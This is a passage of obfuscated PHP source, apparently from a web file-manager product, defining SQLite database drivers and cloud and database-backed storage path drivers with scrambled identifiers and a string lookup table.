return !1; } $this->queryStr = $âëëÁ×; if ($this->queryID) { $this->free(); } think_action_status($âÆÀ¤˜»[25], 1); think_status($âÆÀ¤˜»[24]); $ì’¹ªúŒ = sqlite_exec($this->_linkID, $âëëÁ×); $this->debug(); if (!1 === $ì’¹ªúŒ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[”øäÃÍª][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $É¹À®×¾ = sqlite_query($this->_linkID, $_SERVER[”øäÃÍª][27]); if (!$É¹À®×¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊÑíÖ = sqlite_query($this->_linkID, $_SERVER[”øäÃÍª][28]); if (!$ÊÑíÖ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $àº´¡³‚ = array(); if ($this->numRows > 0) { for ($ĞèĞàÉ = 0; $ĞèĞàÉ < $this->numRows; $ĞèĞàÉ++) { $àº´¡³‚[$ĞèĞàÉ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $àº´¡³‚; } public function getFields($êúÙæÚú) { $Œúúıãü =& $_SERVER[”øäÃÍª]; $ıß¹Ø‡Ÿ = $this->query($Œúúıãü[29] . $êúÙæÚú . $Œúúıãü[30]); $ÖÎ³Ñ§ = array(); if ($ıß¹Ø‡Ÿ) { foreach ($ıß¹Ø‡Ÿ as $ä‰Öİ¡ => $Ç®±­†) { $ÖÎ³Ñ§[$Ç®±­†[$Œúúıãü[31]]] = array($Œúúıãü[32] => $Ç®±­†[$Œúúıãü[31]], $Œúúıãü[33] => $Ç®±­†[$Œúúıãü[34]], $Œúúıãü[35] => (bool) ($Ç®±­†[$Œúúıãü[36]] === $Œúúıãü[12]), $Œúúıãü[37] => $Ç®±­†[$Œúúıãü[38]], $Œúúıãü[39] => strtolower($Ç®±­†[$Œúúıãü[40]]) == $Œúúıãü[41], $Œúúıãü[42] => strtolower($Ç®±­†[$Œúúıãü[43]]) == $Œúúıãü[44]); } } return $ÖÎ³Ñ§; } public function getTables($ï›•×ù· = '') { $ÈÓ³âİ =& $_SERVER[”øäÃÍª]; $ôıªÕâƒ = $this->query($ÈÓ³âİ[45] . $ÈÓ³âİ[46] . $ÈÓ³âİ[47]); $•ÈÉà° = array(); foreach ($ôıªÕâƒ as $”à‰·•’ => $¡±ÂÓı×) { $•ÈÉà°[$”à‰·•’] = current($¡±ÂÓı×); } return $•ÈÉà°; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Å»ŠÂ’Ã =& $_SERVER[”øäÃÍª]; $÷™‰ÄšÆ = sqlite_last_error($this->_linkID); $this->error = $÷™‰ÄšÆ . $Å»ŠÂ’Ã[4] . sqlite_error_string($÷™‰ÄšÆ); if ($Å»ŠÂ’Ã[12] != $this->queryStr) { $this->error .= LNG($Å»ŠÂ’Ã[48]) . $this->queryStr; } think_trace($this->error, $Å»ŠÂ’Ã[12], $Å»ŠÂ’Ã[49]); return $this->error; } public function escapeString($ëåÖ¾·) { return sqlite_escape_string($ëåÖ¾·); } public function parseLimit($ïÙï‹ßû) { $ˆ„‡•ù“ =& $_SERVER[”øäÃÍª]; $É¼†ìõş = $ˆ„‡•ù“[12]; if (!empty($ïÙï‹ßû)) { $ïÙï‹ßû = explode($ˆ„‡•ù“[50], $ïÙï‹ßû); if (count($ïÙï‹ßû) > 1) { $É¼†ìõş .= $ˆ„‡•ù“[51] . $ïÙï‹ßû[1] . $ˆ„‡•ù“[52] . $ïÙï‹ßû[0] . $ˆ„‡•ù“[53]; } else { $É¼†ìõş .= $ˆ„‡•ù“[51] . $ïÙï‹ßû[0] . $ˆ„‡•ù“[53]; } } return $É¼†ìõş; } } class DbSqlite3Base extends Db { public function __construct($ĞÖĞ‚Üµ = '') { $õ»ñš÷ =& $_SERVER[”øäÃÍª]; if (!class_exists($õ»ñš÷[54])) { think_exception(think_lang($õ»ñš÷[14]) . $õ»ñš÷[55]); } if (!empty($ĞÖĞ‚Üµ)) { if (!isset($ĞÖĞ‚Üµ[$õ»ñš÷[16]])) { $ĞÖĞ‚Üµ[$õ»ñš÷[16]] = 438; } $this->config = $ĞÖĞ‚Üµ; if (empty($this->config[$õ»ñš÷[17]])) { $this->config[$õ»ñš÷[17]] = array(); } } } public function connect($Ş‘•úŠÈ = '', $Ùøî™Åü = 0) { $™”ÚÕ£ =& $_SERVER[”øäÃÍª]; if (!isset($this->linkID[$Ùøî™Åü])) { if (empty($Ş‘•úŠÈ)) { $Ş‘•úŠÈ = $this->config; } $this->linkID[$Ùøî™Åü] = new SQLite3($Ş‘•úŠÈ[$™”ÚÕ£[21]]); if (!$this->linkID[$Ùøî™Åü]) { think_exception($this->linkID[$Ùøî™Åü]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Ùøî™Åü]->busyTimeout(30000); if (1 != think_config($™”ÚÕ£[22])) { unset($this->config); } } return $this->linkID[$Ùøî™Åü]; } public function free() { $this->queryID = null; } public function query($…¡Àò„Ş) { $¨¬¦øÖ‚ =& $_SERVER[”øäÃÍª]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…¡Àò„Ş; if ($this->queryID) { $this->free(); } think_action_status($¨¬¦øÖ‚[23], 1); think_status($¨¬¦øÖ‚[24]); $this->queryID = $this->_linkID->query($…¡Àò„Ş); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‰ìáïë½ = $this->getAll(); $this->numRows = count($‰ìáïë½); return $‰ìáïë½; } } public function execute($‡ØçÎ©) { $”óùÃÃï =& $_SERVER[”øäÃÍª]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‡ØçÎ©; if ($this->queryID) { $this->free(); } think_action_status($”óùÃÃï[25], 1); think_status($”óùÃÃï[24]); $Ì¥ôÄ¼‡ = $this->_linkID->exec($‡ØçÎ©); $this->debug(); if (!1 === $Ì¥ôÄ¼‡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[”øäÃÍª][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $²€µÉ£“ = $this->_linkID->query($_SERVER[”øäÃÍª][27]); if (!$²€µÉ£“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $œ†·ò“Ø = $this->_linkID->query($_SERVER[”øäÃÍª][28]); if (!$œ†·ò“Ø) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $æ¦†Õš¼ = array(); while ($‘Ôéñ„Ã = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $æ¦†Õš¼[] = $‘Ôéñ„Ã; } $this->queryID->reset(); return $æ¦†Õš¼; } public function getFields($ç¿ˆøÒİ) { $ã°Ãº‰˜ =& $_SERVER[”øäÃÍª]; $ÇÁÙÉú = $this->query($ã°Ãº‰˜[29] . $ç¿ˆøÒİ . $ã°Ãº‰˜[30]); $ƒÖİñîÍ = array(); if ($ÇÁÙÉú) { foreach ($ÇÁÙÉú as $¦¯¡ˆöÙ => $ï¨úÜÂ”) { $ƒÖİñîÍ[$ï¨úÜÂ”[$ã°Ãº‰˜[32]]] = array($ã°Ãº‰˜[32] => $ï¨úÜÂ”[$ã°Ãº‰˜[32]], $ã°Ãº‰˜[33] => $ï¨úÜÂ”[$ã°Ãº‰˜[33]], $ã°Ãº‰˜[35] => (bool) ($ï¨úÜÂ”[$ã°Ãº‰˜[35]] === $ã°Ãº‰˜[12]), $ã°Ãº‰˜[37] => $ï¨úÜÂ”[$ã°Ãº‰˜[56]], $ã°Ãº‰˜[39] => (bool) $ï¨úÜÂ”[$ã°Ãº‰˜[57]], $ã°Ãº‰˜[42] => (bool) $ï¨úÜÂ”[$ã°Ãº‰˜[57]]); } } return $ƒÖİñîÍ; } public function getTables($à‘Ó“‘Ğ = '') { $¨Ù”í =& $_SERVER[”øäÃÍª]; $åÆû§°Ñ = $this->query($¨Ù”í[45] . $¨Ù”í[46] . $¨Ù”í[47]); $¦¥““Òà = array(); foreach ($åÆû§°Ñ as $°ˆ®æëâ => $¤ªÖÙÜ•) { $¦¥““Òà[$°ˆ®æëâ] = current($¤ªÖÙÜ•); } return $¦¥““Òà; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $’€±øÓâ =& $_SERVER[”øäÃÍª]; $this->error = $this->_linkID->lastErrorMsg(); if ($’€±øÓâ[12] != $this->queryStr) { $this->error .= LNG($’€±øÓâ[48]) . $this->queryStr; } think_trace($this->error, $’€±øÓâ[12], $’€±øÓâ[49]); return $this->error; } public function escapeString($ğİÆˆã‘) { $Ÿ¼Ñ¾®ğ =& $_SERVER[”øäÃÍª]; if ($this->_linkID) { return $this->_linkID->escapeString($ğİÆˆã‘); } return str_ireplace($Ÿ¼Ñ¾®ğ[58], $Ÿ¼Ñ¾®ğ[59], $ğİÆˆã‘); } public function parseLimit($Æİ³ü÷) { $²ëĞâÄ =& $_SERVER[”øäÃÍª]; $ÜºÈ»Ÿ = $²ëĞâÄ[12]; if (!empty($Æİ³ü÷)) { $Æİ³ü÷ = explode($²ëĞâÄ[50], $Æİ³ü÷); if (count($Æİ³ü÷) > 1) { $ÜºÈ»Ÿ .= $²ëĞâÄ[51] . $Æİ³ü÷[1] . $²ëĞâÄ[52] . $Æİ³ü÷[0] . $²ëĞâÄ[53]; } else { $ÜºÈ»Ÿ .= $²ëĞâÄ[51] . $Æİ³ü÷[0] . $²ëĞâÄ[53]; } } return $ÜºÈ»Ÿ; } } goto aï®æÀ»; BË•âëÛ‰Û: class PathDriverBOS extends PathDriverS3 { public function __construct($ÈŸŠ¸Ñâ) { parent::__construct($ÈŸŠ¸Ñâ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Á¼€¯æ—) { parent::__construct($Á¼€¯æ—); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } public function uploadFormData($î¤ë€©Š, $›‡ú· = 3600) { $¶ãœ®Å³ =& $_SERVER[”øäÃÍª]; $Àƒá”üò = $¶ãœ®Å³[229]; $º™ÌÎƒ = $¶ãœ®Å³[1479]; $»ãõËı = $¶ãœ®Å³[261]; $š‰¬§ = gmdate($¶ãœ®Å³[1480], time() + $›‡ú·); $íå¨‹°ã = (string) time() . $¶ãœ®Å³[74] . (string) (time() + $›‡ú·); $šóİıÑû = array($¶ãœ®Å³[262] => $š‰¬§, $¶ãœ®Å³[265] => array(array($¶ãœ®Å³[306] => $Àƒá”üò), array($¶ãœ®Å³[266] => $this->bucket), array($¶ãœ®Å³[267], $¶ãœ®Å³[268], $¶ãœ®Å³[12]), array($¶ãœ®Å³[270] => $»ãõËı), array($¶ãœ®Å³[1481] => $º™ÌÎƒ), array($¶ãœ®Å³[1482] => $this->accessKey), array($¶ãœ®Å³[1483] => $íå¨‹°ã))); $šóİıÑû = json_encode($šóİıÑû); $¤¢ˆ´Ò = hash_hmac($¶ãœ®Å³[1479], $íå¨‹°ã, $this->secret); $ÀÏÎì…£ = sha1($šóİıÑû); $ÎãÒíï‚ = hash_hmac($¶ãœ®Å³[1479], $ÀÏÎì…£, $¤¢ˆ´Ò); $ÊÒæ‘şå = array($¶ãœ®Å³[306] => $Àƒá”üò, $¶ãœ®Å³[270] => $»ãõËı, $¶ãœ®Å³[277] => base64_encode($šóİıÑû), $¶ãœ®Å³[1481] => $º™ÌÎƒ, $¶ãœ®Å³[1482] => $this->accessKey, $¶ãœ®Å³[1484] => $íå¨‹°ã, $¶ãœ®Å³[1485] => $ÎãÒíï‚, $¶ãœ®Å³[206] => $this->getHost()); return $ÊÒæ‘şå; } public function fileOutImage($üŸµ¥»ó, $èùáÔÆ = 250) { $ğùúé³— =& $_SERVER[”øäÃÍª]; if ($this->size($üŸµ¥»ó) > 1024 * 1024 * 32) { return $this->fileOutImageServer($üŸµ¥»ó, $èùáÔÆ); } $ş¶²–Üñ = $this->link($üŸµ¥»ó); $ş¶²–Üñ .= $ğùúé³—[1486] . $èùáÔÆ . $ğùúé³—[1487]; $this->fileOutLink($ş¶²–Üñ); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¾É £É) { $this->pathParse = $¾É £É; $this->model = Model($_SERVER[”øäÃÍª][1488]); } public function getPath($—˜ï¶ƒ¦) { return trim($—˜ï¶ƒ¦, $_SERVER[”øäÃÍª][8]); } public function pathFather($ŞôûğÑà) { $ó®üà¶º = $this->parse($ŞôûğÑà); $ó®üà¶º = $this->infoSimple($ŞôûğÑà); return $ó®üà¶º ? $ó®üà¶º[$_SERVER[”øäÃÍª][190]] : !1; } public function pathThis($äçáø–) { $›×¢Ÿá¼ = $this->infoSimple($äçáø–); return $›×¢Ÿá¼ ? $›×¢Ÿá¼[$_SERVER[”øäÃÍª][32]] : !1; } public function getPathOuter($‚ş•ËĞë) { if (!$‚ş•ËĞë) { return $‚ş•ËĞë; } $èïß½Ü¯ = $this->parse($‚ş•ËĞë); return KodIO::make($èïß½Ü¯[$_SERVER[”øäÃÍª][487]]); } public function copyFolderFromIO($°ºïÙô¶, $ÂıÍ‰¥ê, $¡€±ÌÓé, $ãÊí¼, $ı‹¯Ú‰±) { $’àŸÒ¸ = $this->model->copyFolderFromIO($°ºïÙô¶, $ÂıÍ‰¥ê, $¡€±ÌÓé, $ãÊí¼, $ı‹¯Ú‰±); return KodIO::make($’àŸÒ¸); } public function isParentOf($ŒŞóôÜõ, $½Ÿ¡Ô´‚) { return $this->model->isParentOf($ŒŞóôÜõ, $½Ÿ¡Ô´‚); } public function mkfile($“®êõ÷º, $¾†İåû² = '', $ˆŒ‘Š¡ó = REPEAT_RENAME) { $²¤ãõÙ =& $_SERVER[”øäÃÍª]; $›”ì˜Ëİ = $this->parse($“®êõ÷º); $“®êõ÷º = $›”ì˜Ëİ[$²¤ãõÙ[487]]; for ($•ğ²¨øÒ = 0; $•ğ²¨øÒ < count($›”ì˜Ëİ[$²¤ãõÙ[1489]]); $•ğ²¨øÒ++) { $®ÀüÚõÍ = $›”ì˜Ëİ[$²¤ãõÙ[1489]][$•ğ²¨øÒ]; if ($•ğ²¨øÒ == count($›”ì˜Ëİ[$²¤ãõÙ[1489]]) - 1) { $“®êõ÷º = $this->model->mkfile($“®êõ÷º, $®ÀüÚõÍ, $¾†İåû², $ˆŒ‘Š¡ó); break; } $“®êõ÷º = $this->model->mkdir($“®êõ÷º, $®ÀüÚõÍ, REPEAT_SKIP); } return $this->getPathOuter($“®êõ÷º); } public function mkdir($òÒÖÈó, $İÉ¿™³» = REPEAT_SKIP) { $òš¶õ‰¡ =& $_SERVER[”øäÃÍª]; $åœûéí = $this->parse($òÒÖÈó); $òÒÖÈó = $åœûéí[$òš¶õ‰¡[487]]; for ($Àû¶Æı„ = 0; $Àû¶Æı„ < count($åœûéí[$òš¶õ‰¡[1489]]); $Àû¶Æı„++) { $úÊÓˆù = $åœûéí[$òš¶õ‰¡[1489]][$Àû¶Æı„]; $òÒÖÈó = $this->model->mkdir($òÒÖÈó, $úÊÓˆù, $İÉ¿™³»); } return $this->getPathOuter($òÒÖÈó); } public function copyFile($•œ÷©—«, $ÑøÇ¡Ìë, $–¶¿¤ö = REPEAT_REPLACE) { $”ˆöòèõ =& $_SERVER[”øäÃÍª]; $Ã­ÖÅùÍ = $this->parse($ÑøÇ¡Ìë); $–ÈÙ¬™Ú = $this->model->copy($•œ÷©—«, $Ã­ÖÅùÍ[$”ˆöòèõ[487]], $–¶¿¤ö, $Ã­ÖÅùÍ[$”ˆöòèõ[87]]); return $–ÈÙ¬™Ú ? $this->getPathOuter($–ÈÙ¬™Ú) : !1; } public function moveFile($»Ì¯æÒÊ, $±š¦äëë, $³Ù›Äò‰ = REPEAT_REPLACE) { $şÒ™êËµ =& $_SERVER[”øäÃÍª]; $‚Š¹Ğ¹£ = $this->parse($±š¦äëë); $­ÃˆŸ¡ = $this->model->move($»Ì¯æÒÊ, $‚Š¹Ğ¹£[$şÒ™êËµ[487]], $³Ù›Äò‰, $‚Š¹Ğ¹£[$şÒ™êËµ[87]]); return $­ÃˆŸ¡ ? $this->getPathOuter($­ÃˆŸ¡) : !1; } public function copy($Äìï†²é, $’ƒ™Û, $©…¸õÊÖ = REPEAT_REPLACE, $”¨à™òã = false) { $Û¿âÄİŞ = $this->parse($’ƒ™Û); $§êÍÛÇ¹ = $this->model->copy($Äìï†²é, $Û¿âÄİŞ[$_SERVER[”øäÃÍª][487]], $©…¸õÊÖ, $”¨à™òã); return $§êÍÛÇ¹ ? $this->getPathOuter($§êÍÛÇ¹) : !1; } public function moveSameAllow() { } public function move($ûà¯ûï, $àÓ©¯ª„, $¡»âóÈÃ = REPEAT_REPLACE, $úàğû„ = false) { $±Íöšì» = $this->parse($àÓ©¯ª„); $‚íèø á = $this->model->move($ûà¯ûï, $±Íöšì»[$_SERVER[”øäÃÍª][487]], $¡»âóÈÃ, $úàğû„); return $‚íèø á ? $this->getPathOuter($‚íèø á) : !1; } public function remove($—³±ß¥”, $›÷æâ³­ = true) { return $this->model->remove($—³±ß¥”, $›÷æâ³­); } public function rename($§ß›è÷÷, $Íûñä†‘) { $×’™„è = $this->model->rename($§ß›è÷÷, $Íûñä†‘); return $×’™„è ? $this->getPathOuter($§ß›è÷÷) : $×’™„è; } public function size($Œ·–ª»¯) { $¦ŒÎ„™‰ = $this->infoSimple($Œ·–ª»¯); return $¦ŒÎ„™‰ ? $¦ŒÎ„™‰[$_SERVER[”øäÃÍª][79]] : 0; } public function infoSimple($š—¥ÀÖš) { return $this->model->sourceInfo($š—¥ÀÖš); } public function info($¶Ğ€‰Î‡) { return $this->infoParse($¶Ğ€‰Î‡); } public function infoAuth($¨ò»Èâó) { return $this->infoParse($¨ò»Èâó, !1, !0); } public function infoWithChildren($Ìó­§±) { return $this->infoParse($Ìó­§±, !0); } protected function infoParse($À¹ùÂ£, $’’•°ìÙ = false, $ì«„ÃÀ“ = false) { if (!$’’•°ìÙ) { return $this->model->pathInfo($À¹ùÂ£, $ì«„ÃÀ“); } return $this->model->pathInfoMore($À¹ùÂ£); } public function infoFullSimple($ÖëÔ»Ş‡) { $ş¯×‘ÖÚ =& $_SERVER[”øäÃÍª]; $¶Ó›’Ğî = explode($ş¯×‘ÖÚ[8], $ÖëÔ»Ş‡); $ôÒœÁåÕ = implode($ş¯×‘ÖÚ[8], array_splice($¶Ó›’Ğî, 1)); return $this->model->pathInfoByPath($¶Ó›’Ğî[0], $ôÒœÁåÕ); } public function infoFull($‘—¨–¢Î) { $®ÄÌ«™ø = $this->infoFullSimple($‘—¨–¢Î); return is_array($®ÄÌ«™ø) ? $this->model->pathInfo($®ÄÌ«™ø[$_SERVER[”øäÃÍª][191]]) : !1; } public function hashSimple($®Š¤«óÒ) { $³õÔÖ¼ =& $_SERVER[”øäÃÍª]; $ŠŒï¿Èˆ = $this->infoWithChildren($®Š¤«óÒ); return $ŠŒï¿Èˆ[$³õÔÖ¼[167]][$³õÔÖ¼[702]]; } public function hashMd5($Å”šè—») { $ÀğŞÇ£ =& $_SERVER[”øäÃÍª]; $¸ƒ·úç´ = $this->infoWithChildren($Å”šè—»); return $¸ƒ·úç´[$ÀğŞÇ£[167]][$ÀğŞÇ£[571]]; } public function exist($ØÚ¯–Ó) { $¬ÜùÒÒ† =& $_SERVER[”øäÃÍª]; $µÊÂÆêê = $this->parse($ØÚ¯–Ó); if (!$µÊÂÆêê[$¬ÜùÒÒ†[87]]) { return $this->isFile($ØÚ¯–Ó) || $this->isFolder($ØÚ¯–Ó); } $İ­˜ªš¯ = array($¬ÜùÒÒ†[500] => $µÊÂÆêê[$¬ÜùÒÒ†[487]], $¬ÜùÒÒ†[32] => $µÊÂÆêê[$¬ÜùÒÒ†[87]]); $ØôĞÖŞÉ = $this->model->where($İ­˜ªš¯)->find(); return $ØôĞÖŞÉ ? !0 : !1; } public function isFile($ìªÁã) { $ƒ±Ê²ù =& $_SERVER[”øäÃÍª]; $¼÷Õ–¿ = $this->infoSimple($ìªÁã); return $¼÷Õ–¿ && $¼÷Õ–¿[$ƒ±Ê²ù[508]] == $ƒ±Ê²ù[228] ? !0 : !1; } public function isFolder($›®ÙÕ) { $ñÖÚ€ø =& $_SERVER[”øäÃÍª]; $‚Û±ˆ—· = $this->infoSimple($›®ÙÕ); return $‚Û±ˆ—· && $‚Û±ˆ—·[$ñÖÚ€ø[508]] == $ñÖÚ€ø[91] ? !0 : !1; } public function listPath($—»Ê–‰Ì, $ËÊ‡äÏ› = false) { $—²‡Ô† =& $_SERVER[”øäÃÍª]; if ($—»Ê–‰Ì == $—²‡Ô†[12]) { return !1; } $¼©¦Ö = array($—²‡Ô†[500] => $—»Ê–‰Ì); if ($ËÊ‡äÏ›) { return $this->model->listSource($¼©¦Ö, -1); } return $this->model->listSource($¼©¦Ö); } public function has($”²ª’—®, $ÒÏÂÄÒÛ = false, $¬±š–Ùù = null) { $ğ¥¥ÂÆû =& $_SERVER[”øäÃÍª]; $úÂĞÆŒŠ = $this->infoWithChildren($”²ª’—®); if ($ÒÏÂÄÒÛ) { return array($ğ¥¥ÂÆû[240] => $úÂĞÆŒŠ[$ğ¥¥ÂÆû[240]], $ğ¥¥ÂÆû[239] => $úÂĞÆŒŠ[$ğ¥¥ÂÆû[239]]); } return $¬±š–Ùù ? $úÂĞÆŒŠ[$ğ¥¥ÂÆû[240]] : $úÂĞÆŒŠ[$ğ¥¥ÂÆû[239]]; } public function listAll($²µ©êË˜) { $º¹ñ¡ = IO::info($this->pathParse[$_SERVER[”øäÃÍª][87]]); if (!$º¹ñ¡) { return array(); } return $this->model->listAll($²µ©êË˜); } public function getContent($Ÿ€à·†ñ) { return $this->model->getContent($Ÿ€à·†ñ); } public function setContent($Îˆ®‘³ˆ, $ıûŠ£Õ§ = '') { return $this->model->setContent($Îˆ®‘³ˆ, $ıûŠ£Õ§); } public function fileSubstr($€âİÂµ¸, $–Àüƒó, $™µ“Æˆ§) { return $this->model->fileSubstr($€âİÂµ¸, $–Àüƒó, $™µ“Æˆ§); } public function download($¦¬«Ä×œ, $Ô¨¹¼ø = '') { $ïÑìòÍ» = get_path_father($Ô¨¹¼ø); $‡“½êŒŸ = get_path_this($Ô¨¹¼ø); $±í€•¹Ú = $this->model->fileInfoGet($¦¬«Ä×œ); $†Ÿ‹øş· = IO::copy($±í€•¹Ú[$_SERVER[”øäÃÍª][87]], $ïÑìòÍ», !1, $‡“½êŒŸ); return $†Ÿ‹øş·; } public function setModifyTime($“ïÔ…, $£æÁ’¸› = '') { $õÁò¥¦° =& $_SERVER[”øäÃÍª]; if (!$“ïÔ…) { return; } $this->model->where(array($õÁò¥¦°[514] => $“ïÔ…))->save(array($õÁò¥¦°[88] => $£æÁ’¸›)); } public function upload($ôÑ­Ñµ, $‚’Ã…œ, $µ°¢‘ÛÃ = false, $”¨÷µÌ› = REPEAT_REPLACE) { $…ó§Æ„ô =& $_SERVER[”øäÃÍª]; $¤ÄåªÎå = $this->parse($ôÑ­Ñµ); $ÉĞãŸúÛ = $this->model->addFile($¤ÄåªÎå[$…ó§Æ„ô[487]], $‚’Ã…œ, $¤ÄåªÎå[$…ó§Æ„ô[87]], $µ°¢‘ÛÃ, $”¨÷µÌ›); return $this->getPathOuter($ÉĞãŸúÛ); } public function uploadFileByID($ç‹˜‰Û, $¶°³ıóê, $ôíŸ¬ßô) { $ğ­ìÄÑ =& $_SERVER[”øäÃÍª]; $üğ·–ÌÕ = $this->parse($ç‹˜‰Û); $â§ÁÉ¦™ = $this->model->addFileByFileID($üğ·–ÌÕ[$ğ­ìÄÑ[487]], $¶°³ıóê, $üğ·–ÌÕ[$ğ­ìÄÑ[87]], $ôíŸ¬ßô); return $this->getPathOuter($â§ÁÉ¦™); } public function addFileByRemote($À£ì¾Ù×, $şÚşî¤ä, $Í¡°—ø = array(), $‚êû‚¥ = '', $ğóÅ›¡¨) { $¡ò¤ƒÙ =& $_SERVER[”øäÃÍª]; $Úâ¼û¿´ = $this->parse($À£ì¾Ù×); $‚êû‚¥ = empty($‚êû‚¥) ? $Úâ¼û¿´[$¡ò¤ƒÙ[87]] : $‚êû‚¥; $Ğßƒ“¡º = $this->model->addFileByRemote($Úâ¼û¿´[$¡ò¤ƒÙ[487]], $şÚşî¤ä, $‚êû‚¥, $Í¡°—ø, $ğóÅ›¡¨); return $this->getPathOuter($Ğßƒ“¡º); } public function uploadLink($Àâ°‚áõ, $²§ÑÈ = 0) { $´ÓãÒ•ê =& $_SERVER[”øäÃÍª]; $›®®¨¹¶ = $this->parse($Àâ°‚áõ); $°ÔœüÀ = _get($GLOBALS[$´ÓãÒ•ê[7]], $´ÓãÒ•ê[1490]); $ÅÎ‰å = _get($GLOBALS[$´ÓãÒ•ê[7]], $´ÓãÒ•ê[1491]); $¾ıÅŠµù = KodIO::ioFileDriverGet($´ÓãÒ•ê[506] . $›®®¨¹¶[$´ÓãÒ•ê[487]] . $´ÓãÒ•ê[402]); $¨ş¾¸ğÁ = Model($´ÓãÒ•ê[704])->createFileName($›®®¨¹¶[$´ÓãÒ•ê[87]], $¾ıÅŠµù, $°ÔœüÀ, $ÅÎ‰å); return IO::uploadLink($¨ş¾¸ğÁ, $²§ÑÈ); } public function fileNameAuto($ØŞìüÁ, $ÛÎë¹Ë£, $Ø•’õÏ = REPEAT_REPLACE, $ÇÌÒ¡Êƒ = false) { return $this->model->fileNameAuto($ØŞìüÁ, $ÛÎë¹Ë£, $Ø•’õÏ, $ÇÌÒ¡Êƒ); } public function fileNameExist($ËÎ×°¢, $ÄÑñó·Î) { return $this->model->fileNameExist($ËÎ×°¢, $ÄÑñó·Î); } protected function _fileOut($Çè¨®¹ê, $àá¾¡…˜ = false, $şñíÚü¦ = false, $«öµ—™ù = '', $âØ‚£ = false) { $Å´®ÊõÆ =& $_SERVER[”øäÃÍª]; $Èõå ø = $this->model->sourceInfo($Çè¨®¹ê); if ($Èõå ø[$Å´®ÊõÆ[508]] == $Å´®ÊõÆ[91]) { header($Å´®ÊõÆ[1492]); die; } $Ë¬Ğ¡ÈÇ = $this->model->fileInfoGet($Çè¨®¹ê); $«öµ—™ù = $Ë¬Ğ¡ÈÇ[$Å´®ÊõÆ[571]] ? $Ë¬Ğ¡ÈÇ[$Å´®ÊõÆ[571]] : $«öµ—™ù; $Óõ´í¾¯ = isset($GLOBALS[$Å´®ÊõÆ[180]]) && is_array($GLOBALS[$Å´®ÊõÆ[180]]) ? $GLOBALS[$Å´®ÊõÆ[180]][$Å´®ÊõÆ[32]] : $Èõå ø[$Å´®ÊõÆ[32]]; if ($âØ‚£) { return IO::fileOutServer($Ë¬Ğ¡ÈÇ[$Å´®ÊõÆ[87]], $àá¾¡…˜, $Óõ´í¾¯, $«öµ—™ù); } IO::fileOut($Ë¬Ğ¡ÈÇ[$Å´®ÊõÆ[87]], $àá¾¡…˜, $Óõ´í¾¯, $«öµ—™ù); } public function fileOut($¾Ÿ°á°ã, $‘ÎŸ® = false, $ÓñÜÙ¸ı = false, $ùˆÇåÕ = '') { $this->_fileOut($¾Ÿ°á°ã, $‘ÎŸ®, $ÓñÜÙ¸ı, $ùˆÇåÕ); } public function fileOutServer($÷„ò¨Ê¡, $ç¶ÃœçÙ = false, $‚Ùı§ù = false, $šÓ¹ôò = '') { $this->_fileOut($÷„ò¨Ê¡, $ç¶ÃœçÙ, $‚Ùı§ù, $šÓ¹ôò, !0); } protected function _fileOutImage($ ‹Ï°şß, $£é‰ì‘ = 250) { $€öæİ¹Ù =& $_SERVER[”øäÃÍª]; $İ€Ê§¯ = $this->model->pathInfo($ ‹Ï°şß); if ($İ€Ê§¯[$€öæİ¹Ù[508]] == $€öæİ¹Ù[91]) { show_json($€öæİ¹Ù[1493] . $ ‹Ï°şß, !1); } $§ß¿ã§¤ = $this->model->fileInfoGet($ ‹Ï°şß); $İ€Ê§¯[$€öæİ¹Ù[181]] = $§ß¿ã§¤[$€öæİ¹Ù[87]]; $GLOBALS[$€öæİ¹Ù[180]] = $İ€Ê§¯; IO::fileOutImage($§ß¿ã§¤[$€öæİ¹Ù[87]], $£é‰ì‘); } public function fileOutImage($ùûøİåø, $»ÔÏÃì = 250) { $this->_fileOutImage($ùûøİåø, $»ÔÏÃì); } public function fileOutImageServer($ì¥÷óæ§, $ôâ™ÔÎ® = 250) { $this->_fileOutImage($ì¥÷óæ§, $ôâ™ÔÎ®); } public function link($Õ¼ì˜¬Ğ, $¤»‘Åë‹ = '') { $È²å†¤Ã = $this->model->fileInfoGet($Õ¼ì˜¬Ğ); return IO::link($È²å†¤Ã[$_SERVER[”øäÃÍª][87]], $¤»‘Åë‹); } protected function parse($åŒ÷âê) { $ŞÕï„àÒ =& $_SERVER[”øäÃÍª]; if (strstr($åŒ÷âê, $ŞÕï„àÒ[8]) === !1) { return array($ŞÕï„àÒ[516] => intval($åŒ÷âê), $ŞÕï„àÒ[87] => $ŞÕï„àÒ[12], $ŞÕï„àÒ[1489] => array()); } $…ãÕ‘Ù¢ = explode($ŞÕï„àÒ[8], trim($åŒ÷âê, $ŞÕï„àÒ[8])); if (count($…ãÕ‘Ù¢) < 2) { 